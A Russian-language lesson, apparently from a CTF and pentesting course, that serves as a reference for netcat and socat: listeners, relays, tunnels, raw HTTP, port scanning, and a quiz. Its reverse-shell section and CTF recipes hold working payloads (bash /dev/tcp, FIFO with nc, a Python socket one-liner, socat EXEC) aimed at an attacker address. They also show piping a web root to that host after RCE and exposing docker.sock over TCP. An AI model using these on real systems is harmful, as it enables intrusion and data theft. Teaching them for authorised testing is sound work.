---
id: web-tool-netcat-socat
title: "netcat и socat: практический справочник"
category: web
parent: web-tools-cli
difficulty: medium
order: 3
tags: [netcat, nc, socat, shell, pivoting, ctf, tunnel, tcp]
prerequisites: [web-http-basics, web-tooling]
useful_for:
  - "CTF Web категория"
  - "CTF Pwn / Network"
  - "Пентест веб-приложений"
  - "Внутренний пентест и pivoting"
estimated_minutes: 40
summary: "Практический справочник по netcat и socat: слушатели, reverse/bind shell, передача файлов, HTTP руками, порт-скан, релеи и туннели для CTF и пентеста."
---

**netcat** (`nc`) — это «швейцарский нож TCP/IP»: читает и пишет байты в сокет. **socat** — его старший брат: умеет связывать между собой любые два «канала» (сокет, файл, PTY, exec, TLS, UNIX-сокет) и поддерживает гораздо больше, чем `nc`. В веб-тестировании они нужны, когда браузера и curl уже мало: поднять слушатель для reverse shell, забрать файл с сервера, поговорить с сервисом вручную, пробросить порт до внутренней сети.

Этот урок — **рабочий справочник**: синтаксис обоих инструментов, реальные рецепты и раздел «типичные сценарии». Он предполагает, что вы понимаете TCP и базовый HTTP (см. `web-http-basics`).

## Шпаргалка: команды, которые нужны в 90% задач

| Команда | Что делает | Пример |
|---------|-----------|--------|
| `nc -lvnp PORT` | слушатель для reverse shell | `nc -lvnp 4444` |
| `nc -zv HOST P1-P2` | порт-скан диапазона | `nc -zv 10.0.0.5 20-25` |
| `nc HOST PORT` | подключиться к сервису | `nc 10.0.0.5 80` |
| `nc -lvnp PORT > f` | принять файл | `nc -lvnp 9001 > loot.tar.gz` |
| `nc HOST PORT < f` | отправить файл | `nc 10.0.0.99 9001 < file.bin` |
| `printf ... \| nc HOST 80` | сырой HTTP-запрос | `printf 'GET / HTTP/1.1\r\nHost: t\r\n\r\n' \| nc t 80` |
| `nc -lvnp PORT -e /bin/bash` | bind shell (если `-e` есть) | `nc -lvnp 4444 -e /bin/bash` |
| `socat TCP-LISTEN:4444,reuseaddr,fork EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane` | стабильный TTY-shell | (см. ниже) |
| `socat TCP-LISTEN:8080,fork TCP:internal:80` | проброс порта | (см. ниже) |
| `socat OPENSSL-LISTEN:443,cert=...,fork TCP:127.0.0.1:8080` | TLS-релей | (см. ниже) |
| `socat -v TCP-LISTEN:8080,fork TCP:t:80` | логгер трафика | (см. ниже) |

## Когда netcat, когда socat

| Задача | Инструмент | Почему |
|--------|-----------|--------|
| Поднять слушатель для reverse shell | **nc** | `nc -lvnp PORT` — короче некуда |
| Интерактивная shell с TTY | **socat** | `pty,stderr,setsid,sigint,sane` даёт полноценный терминал |
| Передать файл по TCP | **nc** | однострочно в обе стороны |
| Проброс порта / релей | **socat** | `TCP-LISTEN ... TCP:target` |
| TLS-обёртка над сокетом | **socat** | `OPENSSL-LISTEN` |
| Несколько клиентов на одном порту | **socat** | `fork` |
| Порт-скан | **nc** | `nc -zv host 1-1000` |
| UNIX-сокет ↔ TCP | **socat** | нативно |

Правило: **сначала nc, если не хватает — socat**. Если shell «рвётся», стрелки/Tab/Ctrl-C не работают — почти всегда нужен socat с PTY.

## netcat: слушатели и подключения

Базовые режимы:

```bash
# Подключиться к хосту:порт (клиент)
nc 10.0.0.5 80

# Слушать порт (сервер)
nc -lvnp 4444

# Подключиться и не разрывать соединение (listen, без DNS)
nc -lvnp 4444
```

Разбор флагов (вариант OpenBSD netcat):

| Флаг | Значение |
|------|----------|
| `-l` | режим слушателя (listen) |
| `-v` | verbose (писать о соединениях) |
| `-n` | не резолвить DNS (быстрее, меньше шума) |
| `-p PORT` | локальный порт для слушателя |
| `-k` | не выходить после отключения клиента (keep listening) |
| `-u` | UDP вместо TCP |
| `-z` | zero-I/O (скан без отправки данных) |
| `-w SEC` | таймаут |
| `-e PROG` | выполнить программу на соединении (**только классический nc/ncat**) |
| `-q SEC` | закрыть соединение через N сек после EOF |

**Важно:** `-e` есть не во всех сборках. Три «диалекта»:

| Вариант | `-e`/`-c` | Особенности |
|---------|-----------|-------------|
| GNU/traditional netcat | да (`-e`) | часто скомпилирован с `GAPING_SECURITY_HOLE` |
| OpenBSD netcat (`nc.openbsd`) | **нет** | безопаснее, но `-e` нет — нужен FIFO-трюк |
| ncat (Nmap) | да (`-e`, `--sh-exec`) | поддержка SSL (`--ssl`), прокси, allow-list |

Проверить, что установлено:

```bash
which nc ncat socat
nc -h 2>&1 | head
```

Если `-e` нет — интерактивную shell делают через FIFO:

```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc -l 4444 > /tmp/f
```

## Полная таблица флагов netcat

Полный список опций OpenBSD netcat (`nc -h`), сгруппированный по назначению. Диалекты (GNU/ncat) добавляют свои (`-e`, `--ssl`), но базовый набор ниже есть почти везде.

| Флаг | Что делает | Пример |
|------|-----------|--------|
| `-4` / `-6` | только IPv4 / только IPv6 | `nc -4 -zv t 443` |
| `-b` | разрешить broadcast (UDP) | `nc -b -u 255.255.255.255 9` |
| `-C` | отправлять CRLF как конец строки | `nc -C t 80` |
| `-D` | включить debug-опцию сокета | `nc -D t 80` |
| `-d` | отцепиться от stdin | `nc -d -l 4444` |
| `-F` | передать fd уже открытого сокета | `nc -F 3` |
| `-h` | справка | `nc -h` |
| `-I LEN` | размер TCP-буфера приёма | `nc -I 1024 t 80` |
| `-i SEC` | задержка между строками / шагами скана | `nc -i 1 -zv t 20-25` |
| `-k` | не закрывать слушатель после клиента | `nc -lvnp 4444 -k` |
| `-l` | режим слушателя | `nc -lvnp 4444` |
| `-M TTL` | исходящий TTL / hop limit | `nc -M 64 t 80` |
| `-m MIN` | минимальный входящий TTL | `nc -m 10 t 80` |
| `-N` | shutdown сокета после EOF на stdin | `nc -N t 80 < req.txt` |
| `-n` | без резолва имён и портов | `nc -nv t 80` |
| `-O LEN` | размер TCP-буфера отправки | `nc -O 4096 t 80` |
| `-P USER` | логин для proxy-аутентификации | `nc -P bob -x proxy:8080 t 80` |
| `-p PORT` | локальный порт | `nc -p 5555 t 80` |
| `-q SEC` | закрыть соединение через N сек после EOF | `nc -q 1 -l 4444 < f` |
| `-r` | случайный порядок удалённых портов | `nc -r -zv t 1-100` |
| `-S` | включить TCP MD5-подпись | `nc -S t 179` |
| `-s ADDR` | локальный source-адрес | `nc -s 10.0.0.9 t 80` |
| `-T KW` | значение TOS | `nc -T 0x10 t 80` |
| `-t` | отвечать на telnet-негоциацию | `nc -t t 23` |
| `-U` | UNIX-доменный сокет | `nc -U /var/run/x.sock` |
| `-u` | UDP-режим | `nc -u -zv t 53` |
| `-V RT` | альтернативная таблица маршрутизации | `nc -V 1 t 80` |
| `-v` | подробно (сообщать о соединениях) | `nc -v t 80` |
| `-W N` | прервать после N принятых пакетов | `nc -W 1 -u t 53` |
| `-w SEC` | таймаут соединения / финального чтения | `nc -w 3 -zv t 443` |
| `-X PROTO` | proxy-протокол (`4`, `4A`, `5`, `connect`) | `nc -X 5 -x 127.0.0.1:9050 t 80` |
| `-x ADDR` | адрес (и порт) прокси | `nc -x 127.0.0.1:8080 t 80` |
| `-Z` | DCCP-режим | `nc -Z t 80` |
| `-z` | zero-I/O (скан без отправки данных) | `nc -zv t 20-25` |

> Опущены флаги, специфичные для конкретной сборки: GNU `-e`/`-c` (выполнить программу), ncat `--ssl`, `--exec`, `--allow`, `--proxy-type`. Они есть не везде — проверяйте `nc -h` на цели.

## Reverse shell и bind shell

**Reverse shell** — цель сама подключается к вам. Обходит входящие firewall-правила (исходящие обычно разрешены). Слушаете вы.

```bash
# На вашей машине (атакующий):
nc -lvnp 4444

# На цели (payload, пример bash):
bash -i >& /dev/tcp/10.0.0.99/4444 0>&1
```

**Bind shell** — цель слушает, вы подключаетесь. Обходит исходящие ограничения, но упирается во входящие.

```bash
# На цели:
nc -lvnp 4444 -e /bin/bash      # если -e доступен

# На атакующем:
nc 10.0.0.5 4444
```

Стандартные payload'ы (для справки; на тесте — только в рамках scope):

```bash
# bash
bash -i >& /dev/tcp/10.0.0.99/4444 0>&1
# sh через FIFO
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.99 4444 > /tmp/f
# python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.99",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
# socat (полноценный TTY)
socat TCP:10.0.0.99:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

После получения shell его почти всегда надо **стабилизировать** (иначе Ctrl-C убьёт соединение):

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# затем Ctrl-Z
stty raw -echo; fg
# Enter, Enter; затем:
export TERM=xterm
stty rows 50 cols 200
```

## Передача файлов через nc

Односторонняя передача (приёмник слушает):

```bash
# На приёмнике:
nc -lvnp 4444 > received.bin

# На отправителе:
nc 10.0.0.99 4444 < file.bin
```

Отправка в обратную сторону (отправитель слушает):

```bash
# На отправителе:
nc -lvnp 4444 < file.bin

# На приёмнике:
nc 10.0.0.99 4444 > received.bin
```

Проверка целостности (обязательно — TCP-поток не гарантирует «файл целиком», если кто-то закрыл рано):

```bash
sha256sum file.bin
# сравнить с received.bin на другой стороне
```

Передача целого каталога:

```bash
# на отправителе
tar czf - ./dir | nc 10.0.0.99 4444
# на приёмнике
nc -lvnp 4444 | tar xzf -
```

Сохранение **живого** соединения после отдачи файла (флаг `-q`):

```bash
nc -lvnp 4444 -q 1 < file.bin    # закроется через 1 сек после отправки
```

## HTTP вручную через nc

Когда нужен полный контроль над «сырым» запросом (smuggling, кастомные заголовки, отсутствие нормализации), HTTP удобно слать через `nc`.

```bash
printf 'GET / HTTP/1.1\r\nHost: t.local\r\nConnection: close\r\n\r\n' | nc t.local 80
```

POST с телом:

```bash
printf 'POST /login HTTP/1.1\r\nHost: t.local\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 19\r\nConnection: close\r\n\r\nuser=admin&pass=abc' | nc t.local 80
```

Через TLS (HTTPS) — только socat или `ncat --ssl`:

```bash
# ncat
printf 'GET / HTTP/1.1\r\nHost: t.local\r\nConnection: close\r\n\r\n' | ncat --ssl t.local 443

# socat
printf 'GET / HTTP/1.1\r\nHost: t.local\r\nConnection: close\r\n\r\n' | socat - OPENSSL:t.local:443,verify=0
```

Через nc удобно тестировать **request smuggling**: вы руками задаёте `Content-Length`/`Transfer-Encoding` и видите, как сервер «зависает» или отвечает дважды.

Интерактивная «сессия» к HTTP-сервису (руками набирать запрос):

```bash
nc t.local 80
GET /admin HTTP/1.1
Host: t.local

```

## Порт-сканирование и баннер-граббинг

`nc` умеет быстро проверить порты без nmap:

```bash
# Проверить один порт
nc -zv 10.0.0.5 443

# Диапазон портов
nc -zv 10.0.0.5 20-25

# Несколько портов
nc -zv 10.0.0.5 22 80 443 3306

# UDP-порт
nc -zvu 10.0.0.5 53
```

Баннер-граббинг (что за сервис):

```bash
nc -nv 10.0.0.5 22      # SSH-баннер
nc -nv 10.0.0.5 25      # SMTP-баннер
printf 'GET / HTTP/1.0\r\n\r\n' | nc 10.0.0.5 80   # HTTP-заголовки
```

Для внутреннего пентеста `nc -z` — быстрый способ «прощупать» хост после получения foothold, не таща туда nmap.

## socat: релеи, туннели, PTY

socat связывает два адреса: `socat [опции] <адрес1> <адрес2>`. Адрес описывается как `ТИП:параметры,опции`.

Ключевые типы адресов:

| Тип | Смысл |
|-----|-------|
| `TCP-LISTEN:PORT` | слушать TCP |
| `TCP:HOST:PORT` | подключиться к TCP |
| `OPENSSL-LISTEN:PORT` | слушать с TLS |
| `OPENSSL:HOST:PORT` | подключиться по TLS |
| `EXEC:CMD` | запустить программу |
| `PTY` | псевдотерминал |
| `STDIN` / `-` | стандартный ввод |
| `UNIX-LISTEN:/path` | UNIX-сокет |
| `FILE:path` | файл |

Полезные опции: `reuseaddr` (переиспользовать порт), `fork` (новый процесс на каждого клиента), `pty`, `stderr`, `setsid`, `sigint`, `sane` (корректная обработка Ctrl-C), `verify=0` (не проверять TLS), `cert=`/`key=`.

## Полная таблица флагов socat

Глобальные опции `socat` (до адресов):

| Флаг | Что делает | Пример |
|------|-----------|--------|
| `-d` | повысить уровень отладки (`-dd`, `-ddd`) | `socat -d -d TCP-LISTEN:4444 -` |
| `-d0` | сбросить уровень отладки | `socat -d0 TCP-LISTEN:8080 -` |
| `-v` | печатать поток данных в stderr | `socat -v TCP-LISTEN:8080 TCP:t:80` |
| `-x` | hex-дамп потока | `socat -x TCP-LISTEN:8080 TCP:t:80` |
| `-b SIZE` | размер блока данных | `socat -b 8192 TCP-LISTEN:8080 TCP:t:80` |
| `-s` | печатать статистику потока при завершении | `socat -s TCP-LISTEN:8080 TCP:t:80` |
| `-t SEC` | таймаут простоя канала | `socat -t 30 TCP-LISTEN:4444 -` |
| `-T SEC` | общий таймаут | `socat -T 60 TCP-LISTEN:4444 -` |
| `-u` | однонаправленно, лево → право | `socat -u FILE:data.bin TCP:t:4444` |
| `-U` | однонаправленно, право → лево | `socat -U TCP-LISTEN:4444 FILE:out.bin` |
| `-l FILE` | логировать в файл | `socat -l socat.log TCP-LISTEN:8080 TCP:t:80` |
| `-lf FILE` | имя лог-файла | `socat -lf /tmp/s.log TCP-LISTEN:8080 TCP:t:80` |
| `-ls` / `-ly` | лог в stderr / syslog | `socat -ls TCP-LISTEN:8080 TCP:t:80` |
| `-lp NAME` | имя процесса в логе | `socat -lp relay TCP-LISTEN:8080 TCP:t:80` |
| `-h` / `-V` | справка / версия | `socat -V` |

Ключевые опции адресов: `reuseaddr`, `fork`, `reuseport`, `bind=IP`, `range=IP/mask`, `pty`, `stderr`, `setsid`, `sigint`, `sane`, `raw`, `echo=0`, `verify=0`, `cert=`, `key=`, `cafile=`, `openssl-method=`, `retry=N`, `interval=SEC`, `forever`, `readbytes=N`, `crlf`/`cr`, `ignoreeof`.

**Reverse shell-слушатель с полноценным TTY (золотой стандарт):**

```bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
```

**Проброс порта (port forward):** локальный `127.0.0.1:8080` → внутренний `10.10.10.5:80`.

```bash
socat TCP-LISTEN:8080,reuseaddr,fork TCP:10.10.10.5:80
```

**Релей с TLS-терминацией:**

```bash
socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:127.0.0.1:8080
```

**UNIX-сокет ↔ TCP** (доступ к docker.sock через сеть):

```bash
socat TCP-LISTEN:2375,reuseaddr,fork UNIX-CONNECT:/var/run/docker.sock
```

**Дамп трафика в файл (простой MITM/логгер):**

```bash
socat -v TCP-LISTEN:8080,reuseaddr,fork TCP:t.local:80 2>traffic.log
```

`-v` печатает поток в stderr с направлением — получается «бедный человек's mitmproxy».

## Рецепты для CTF и пентеста

**Поднять стабильный слушатель и стабилизировать shell:**

```bash
# слушатель
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
# на цели
socat TCP:10.0.0.99:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

**Забрать файл с веб-сервера, у которого только nc:**

```bash
# приёмник
nc -lvnp 9001 > loot.tar.gz
# на цели (через RCE)
tar czf - /var/www/html | nc 10.0.0.99 9001
```

**Проверить, «звонит ли» цель наружу (egress-тест):**

```bash
# слушатель на атакующем
nc -lvnp 4444
# на цели
nc -zv 10.0.0.99 4444
```

**Обойти ограничение «только исходящий трафик» релеем:**

```bash
# на промежуточном хосте: принимает снаружи, отдаёт внутрь
socat TCP-LISTEN:9000,reuseaddr,fork TCP:internal.db.local:3306
```

**Поговорить с не-HTTP сервисом (Redis, MySQL, SMTP) вручную:**

```bash
printf 'PING\r\n' | nc 10.0.0.5 6379          # Redis
nc -nv 10.0.0.5 25                            # SMTP: HELO / VRFY / QUIT
```

## Типичные сценарии: что делать в любой ситуации

**«Нужен reverse shell-слушатель».** `nc -lvnp 4444`. Если shell «рвётся» — `socat ... EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane`.

**«Shell получен, но нет TTY».** Стабилизируйте: `python3 -c 'import pty;pty.spawn("/bin/bash")'`, Ctrl-Z, `stty raw -echo; fg`, `export TERM=xterm`.

**«На цели нет nc, но есть bash».** `/dev/tcp`: `bash -i >& /dev/tcp/IP/PORT 0>&1`.

**«На цели нет bash, но есть python».** Python one-liner с `socket`+`subprocess` (см. раздел reverse shell).

**«Надо передать файл».** Приёмник: `nc -lvnp 4444 > f`; отправитель: `nc IP 4444 < f`; затем `sha256sum` с двух сторон.

**«Надо прокинуть порт до внутренней сети».** `socat TCP-LISTEN:8080,reuseaddr,fork TCP:internal:80`, затем обращайтесь на `127.0.0.1:8080`.

**«HTTP-сервис странно реагирует на заголовки».** Отправьте «сырой» запрос через `printf ... | nc host 80` и варьируйте `Content-Length`/`Transfer-Encoding`.

**«Нужен TLS-коннект, а nc не умеет».** `ncat --ssl host 443` или `socat - OPENSSL:host:443,verify=0`.

**«Хочу залогировать трафик между клиентом и сервером».** `socat -v TCP-LISTEN:8080,reuseaddr,fork TCP:target:80 2>traffic.log`.

**«Слушатель падает после первого клиента».** Добавьте `fork` (socat) или `-k` (nc).

## Частые ошибки и безопасность

- **Забыть `-k`/`fork`** — слушатель умирает после первого соединения.
- **Использовать `-e` в OpenBSD netcat** — его там нет; нужен FIFO-трюк или socat.
- **Не стабилизировать shell** — Ctrl-C убивает сессию, не работают стрелки и Tab.
- **Слушать на `0.0.0.0` без необходимости** — открываете порт всем; по возможности биндитесь на конкретный IP.
- **Передавать файл без проверки хеша** — обрыв TCP даёт битый файл, а вы этого не заметите.
- **Путать `-l` с `-p`** — `-p` без `-l` в части сборок трактуется как локальный порт клиента; для слушателя нужен `-l`.
- **Оставить `socat`/`nc`-релей висеть** — это открытый доступ к внутренней сети; убивайте после использования.
- **Безопасность и закон:** reverse/bind shell, релеи и проброс портов — только в рамках авторизованного теста. На реальных целях не поднимайте постоянных доступов, которые кто-то другой сможет использовать.

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "Как поднять простой TCP-слушатель на порту 4444?"
  options:
    - "nc -zv 4444"
    - "nc 4444 -e"
    - "nc -lvnp 4444"
    - "nc -u 4444"
  answer: 2
  explanation: "`-l` слушатель, `-v` verbose, `-n` без DNS, `-p` порт."
- question: "Какой слушатель socat даёт интерактивный TTY для shell?"
  options:
    - "nc -lvnp 4444 -e /bin/sh"
    - "socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"
    - "socat TCP:4444 FILE:/bin/bash"
    - "socat - TCP:4444"
  answer: 1
  explanation: "Комбинация pty,stderr,setsid,sigint,sane даёт полноценный терминал."
- question: "Как передать файл file.bin на приёмник, слушающий порт 4444?"
  options:
    - "nc -lvnp 4444 < file.bin"
    - "nc 10.0.0.99 4444 > file.bin"
    - "nc 10.0.0.99 4444 < file.bin"
    - "nc -z 10.0.0.99 4444"
  answer: 2
  explanation: "Отправитель подключается и направляет файл в stdin сокета."
- question: "Что делает опция fork в socat?"
  options:
    - "Отключает проверку TLS"
    - "Обрабатывает несколько подключений, запуская процесс на каждого клиента"
    - "Заставляет слушать только один раз"
    - "Передаёт файл"
  answer: 1
  explanation: "Без fork socat обслуживает одно соединение и завершается."
- question: "Почему после reverse shell рекомендуют стабилизировать TTY?"
  options:
    - "Это ускоряет соединение"
    - "Это скрывает IP"
    - "Без TTY не работают интерактивные команды и Ctrl-C рвёт сессию"
    - "Без этого сервер вернёт 404"
  answer: 2
  explanation: "Стандартный shell без PTY не даёт полноценного терминала; socat с pty решает это сразу."
```

## Где пригодится

- **CTF (Web/Pwn/Network):** reverse shell, передача файлов, ручной HTTP и разбор сервисов — базовые операции.
- **Bug bounty:** проверка SSRF/egress «звонком» наружу, разговор с нестандартными сервисами вручную.
- **Пентест:** получение и стабилизация foothold, проброс портов до внутренней сети, релеи.
- **Работа (IR/SOC):** анализ сетевого обмена, ручная проверка сервисов без специализированных клиентов, разбор подозрительных соединений.
